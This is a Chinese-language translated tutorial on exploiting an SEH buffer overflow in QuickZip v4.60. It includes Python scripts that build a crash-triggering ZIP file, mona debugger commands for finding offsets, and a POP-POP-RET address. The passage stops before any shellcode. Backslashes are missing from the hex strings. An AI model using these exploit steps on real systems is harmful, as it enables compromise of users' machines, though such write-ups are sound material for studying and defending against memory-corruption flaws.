# 【技术分享】QuickZip V4.60 缓冲区溢出漏洞详解
|
##### 译文声明
本文是翻译文章，文章来源：knapsy.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
翻译：[ **shan66**](http://bobao.360.cn/member/contribute?uid=2522399780)
**预估稿费：300RMB**
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**前言**
**本文将为读者详细介绍QuickZip v4.60缓冲区溢出漏洞方面的知识。** 由于漏洞在2010年就出现了，所以它的设计仅适用于32位Windows
XP。所以，我决定尝试在64位Windows 7上重现该漏洞，这将是一个（有趣的）挑战！
**PoC**
为此，我从exploit-db中抓取了QuickZip v4.60 Windows XP漏洞，并将用它创建了一个简单的PoC来触发崩溃。
    #!/usr/bin/python
    header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
    header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
    "x24x00x00x00x00x00x00x00")
    header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
    "x12x10x00x00x02x10x00x00x00x00")
    print "[+] Building PoC.."
    max_size = 4064
    payload = "A" * max_size
    payload += ".txt"
    print "[+] Length = " + str(len(payload))
    exploit = header_1 + payload + header_2 + payload + header_3
    mefile = open('cst.zip','w');
    mefile.write(exploit);
    mefile.close()
    print "[+] Exploit complete!"
上述代码创建了一个压缩文件，其中只包含一个名为4064A的文件，它的扩展名为“.txt”。
Header_1，header_2和header_3是ZIP文件结构所需的标题。 我不会详细介绍，但您可以在这里阅读更多。
如果您在QuickZip中打开刚创建的ZIP文件，并尝试提取其内容（或只需双击文件名），那么QuickZip就会崩溃。
**了解崩溃详情**
好的，我们来运行PoC，看看到底发生了什么。
使用上面的Python脚本创建ZIP文件，使用QuickZip打开它，启动ImmunityDebugger，附加到QuickZip进程，并在QuickZip中双击文件名以触发崩溃。
注意：我们将不断重复这个过程！
很好，崩溃如期而至。 另外，这里出现了一个异常，屏幕底部可以看到“Access violation when writing to [00190000]”。
这意味着我们试图写入一个无效的内存地址，从而触发了一个异常。
下面，我们来研究一下SEH链。
很好，看来我们能够控制nSEH指针！下面，我们尝试算出偏移量。
**偏移量**
一如既往，我要借助mona（ ）来完成许多工作。
首先，我们生成一个4064个独特字符的模版，并将其放在PoC漏洞利用代码的有效载荷中：
    !mona pc 4064
再次触发崩溃，看看会发生什么情况。
呃，崩溃看起来有点不同。 这里的问题是LEAVE指令尝试从堆栈跳回到0EEDFADE地址，不过这里是该程序的无效内存地址。
此外，似乎我们无法控制SEH了。
但是，请注意，我们实际上是在内核模块中（请看Immunity窗口的名称：“CPU – main thread, module KERNELBA”）。
使用SHIFT + F9将执行权传回给程序，看看是否触发另一个异常，但是是在QuickZip模块中。
真棒，看起来成功了！
使用以下命令让mona计算所有偏移量：
    ！mona findmsp
在这里，我们最感兴趣的偏移是nSEH field: offset 292。
让我们用偏移信息更新PoC，并尝试再次触发崩溃。
    #!/usr/bin/python
    header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
    header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
    "x24x00x00x00x00x00x00x00")
    header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
    "x12x10x00x00x02x10x00x00x00x00")
    print "[+] Building PoC.."
    max_size = 4064
    nseh_offset = 292
    payload = "A" * nseh_offset     # padding for nSEH
    payload += "BBBB"               # nSEH
    payload += "CCCC"               # SEH
    payload += "A" * (max_size - len(payload))   # padding for the rest of payload
    payload += ".txt"
    print "[+] Length = " + str(len(payload))
    exploit = header_1 + payload + header_2 + payload + header_3
    mefile = open('cst.zip','w');
    mefile.write(exploit);
    mefile.close()
    print "[+] Exploit complete!"
太好了，我们控制了SEH！让我们将异常传给程序（SHIFT + F9），并进一步调查发生了什么。
当然，另外一个异常也被触发，因为43434343是这个程序的无效内存地址，但是让我们看看堆栈上到底发生了什么——通常是SEH溢出，我们需要调用一组POP-POP-RET指令来返回到缓冲区。
找到这样的指令是很容易的，但首先，我们必须知道允许使用哪些字符。这就是我们需要关注的下一个问题。
**坏字符**
总的来说，大部分是这样的。为什么？因为我们的溢出是针对filename参数的，而文件名用到的字符类型是相当有限的： 通常只有ASCII可打印的字符。
如果使用手动方式的话，那么使用mona通过遍历方法找到所有坏的字符将需要太长的时间，所以这里简单假设除了0x00、0x0a和0x0d（分别代表NULL、换行和回车）之外，我可以使用ASCII表中所有的字符（最高值为0x7F的字符）。
这个假设可能会比事情比实际情况要更困难（因为我需要避免使用实际可以使用的字符）一些，或者可能会导致更多的问题，如果我的假设范围内的某些字符其实是错误的话。
我不喜欢这样做假设，但为了进行这个练习，这里例外一次。
我只需要记住，要格外小心，如果有情况，则需要再次检查坏的字符。这有点冒险，但很好玩，继续！
**POP-POP-RET**
让我们通过mona来寻找一个易于使用的POP-POP-RET指令：
    ！mona seh
这里找到很多结果（7909！），但突出显示的结果看起来最有希望——全部由字母数字字符组成，位于QuickZip.exe二进制文件本身中，有望使其更具跨平台特性，因为我们不希望依赖特定的操作系统DLL。
这里唯一的问题是0x00字节，但是由于程序的地址空间的原因，每个地址都以0x00开头，所以我们来尝试一下，看看是否会影响我们的漏洞利用代码。
更新PoC漏洞利用代码，用 x33 x28 x42 x00替换目前代表SEH的CCCC，再次触发崩溃并考察SEH链。
好的，看起来我们的地址没有乱码，跟我们的预期相符。 设置断点（F2），然后按SHIFT + F9将控制权传递给程序。
如您所见，我们将重定向到POP-POP-RET指令，让我们用F8进行操作，并在RETN 4指令之后停止。